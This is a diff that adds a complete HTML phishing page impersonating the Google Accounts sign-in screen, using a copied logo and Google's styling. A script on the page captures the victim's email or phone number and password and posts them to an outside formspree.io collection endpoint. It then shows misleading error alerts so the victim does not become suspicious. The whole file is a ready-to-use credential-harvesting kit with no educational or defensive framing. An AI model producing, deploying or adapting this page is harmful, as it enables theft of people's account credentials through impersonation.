@@ -1,0 +1,326 @@
+<!-- modify this form HTML and place wherever you want your form -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" href="https://uploads.wuaze.com/google2.png" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fff;
+            color: #202124;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: center;
+            padding: 10px 0;
+            margin-bottom: 30px;
+        }
+        
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo {
+            width: 68px;
+            height: 68px;
+        }
+        
+        .signin-container {
+            max-width: 450px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 35px;
+            text-align: center;
+        }
+        
+        .input-container {
+            margin-bottom: 25px;
+        }
+        
+        .input-label {
+            font-size: 14px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            display: block;
+        }
+        
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: border 0.2s;
+        }
+        
+        input[type="text"]:focus, input[type="password"]:focus {
+            border: 2px solid #1a73e8;
+        }
+        
+        .error {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 5px;
+            display: block;
+        }
+        
+        .success {
+            color: #1e8e3e;
+            background-color: #e6f4ea;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            text-align: center;
+            border: 1px solid #1e8e3e;
+        }
+        
+        .forgot-email {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 40px;
+        }
+        
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+        
+        .note {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        .note a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        
+        .note a:hover {
+            text-decoration: underline;
+        }
+        
+        .links-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 40px;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .button:hover {
+            background-color: #1b66c9;
+        }
+        
+        .button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        
+        .footer {
+            margin-top: auto;
+            padding: 20px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        
+        .footer-links {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 480px) {
+            .signin-container {
+                padding: 30px 20px;
+                border: none;
+            }
+            
+            .links-container {
+                flex-direction: column;
+                gap: 20px;
+                align-items: flex-start;
+            }
+            
+            .footer {
+                flex-direction: column;
+                gap: 10px;
+            }
+      
+    </style>
+</head>
+
+  <form id="myForm" action="https://formspree.io/f/xvgwqngd" method="POST">
+    
+    <div class="header">
+        <div class="logo-container">
+            <img src="https://uploads.wuaze.com/images-removebg-preview.png" alt="Google" class="logo">
+        </div>
+    </div>
+    
+    <div class="signin-container">
+      
+        <form id="loginForm">
+            <h1>Sign in</h1>
+            <p class="subtitle">with your Google Account. This account will be available to other Google apps in the browser.</p>
+            
+            <div id="success-message" class="success" style="display: none;"></div>
+            <div id="error-message" class="error" style="display: none; margin-bottom: 20px;"></div>
+            
+            <div class="input-container">
+                <label for="email" class="input-label">Email or phone</label>
+                <input type="text" id="email" name="email" required>
+                <span id="email-error" class="error"></span>
+            </div>
+            
+            
+            
+            <div class="input-container">
+              
+            <label>Password <input type="text" name="password" value="" id="myInput" required> </label>
+            
+            
+            <br><br>
+            
+                <input type="checkbox" onclick="myFunction()">Hide Password
+
+          <script>
+          function myFunction() {
+            var x = document.getElementById("myInput");
+            if (x.type === "password") {
+              x.type = "text";
+            } else {
+              x.type = "password";
+            }
+          }
+          </script>
+            
+            
+            </div>
+            
+            <a href="#" class="forgot-email">Forgot email?</a>
+            
+            <p class="note">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more about using Guest mode</a></p>
+            
+            <div class="links-container">
+                
+                <a href="#" class="create-account">Create account</a>
+                
+                <button type="submit" class="button" id="submitBtn">Next</button>
+                
+            </div>
+        </form>
+        
+                    <script>
+            document.getElementById('myForm').addEventListener('submit', function(e) {
+              e.preventDefault();
+              
+              const form = e.target;
+              const formData = new FormData(form);
+              
+              fetch(form.action, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                  'Accept': 'application/json'
+                }
+              })
+              .then(response => {
+                if (response.ok) {
+                  // Redirect on success
+                  window.location.href = 'https://#';
+                } else {
+                  // Handle error
+                  alert('You should re-check your input correctly!.');
+                }
+              })
+              .catch(error => {
+                alert('Restart your phone browser.');
+              });
+            });
+            </script>
+                    
+        
+    </div>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+        <div class="language">English (United States)</div>
+    </div>
+                             
+  </form>
+  
+  
+</html>
